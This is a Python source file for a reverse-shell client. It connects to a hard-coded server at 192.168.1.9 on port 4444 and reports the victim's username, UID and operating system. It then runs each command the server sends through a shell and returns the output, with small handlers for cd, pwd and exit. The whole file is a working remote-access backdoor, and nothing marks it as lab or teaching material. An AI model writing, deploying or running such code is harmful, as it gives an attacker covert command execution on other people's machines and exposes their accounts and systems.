import socket
import subprocess
import os
import pwd
import platform
import time
def session_handler():
    try:
        sock.connect((server_ip,server_port))
        conn_out(pwd.getpwuid(os.getuid())[0])
        time.sleep(1)
        conn_out(os.getuid())
        time.sleep(1)
        conn_out(platform.uname()[0]+platform.uname()[2])

        print("Connected with ", server_ip)
        while True:
            msg = conn_in()
            if msg == "exit":
                print("Server terminated connection")
                sock.close()
                break
            elif msg.split(" ")[0] == "cd":
                try:
                    directory = str(msg.split(" ")[1])
                    os.chdir(directory)
                    res = "Changed to " + os.getcwd()
                    conn_out(res)
                except FileNotFoundError:
                    msg = "Invalid directory. Enter valid directory"
                    conn_out(msg)
                    continue
            elif msg.split(" ")[0] == "pwd":
                print(os.getcwd())
                res = os.getcwd()
                conn_out(res)
            elif msg == "background":
                pass
            elif msg == "help":
                pass
            else:
                com = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                res = com.stdout.read() + com.stderr.read()
                conn_out(res.decode())
    except ConnectionRefusedError:
        pass
    except KeyboardInterrupt:
        print('\n keyboard interrupt issued')
        sock.close()    
    except Exception:
        sock.close()

def conn_in():
    print("waiting for server")
    while True:
        try:
            res = sock.recv(1024).decode()
            print(res)
            return res
        except KeyboardInterrupt:
            print("\n keyboard Interrupt")
            sock.close()
        except Exception:
            sock.close()
def conn_out(msg):
    message = str(msg).encode()
    sock.send(message)

if __name__=='__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_ip="192.168.1.9"
    server_port=4444
    session_handler()
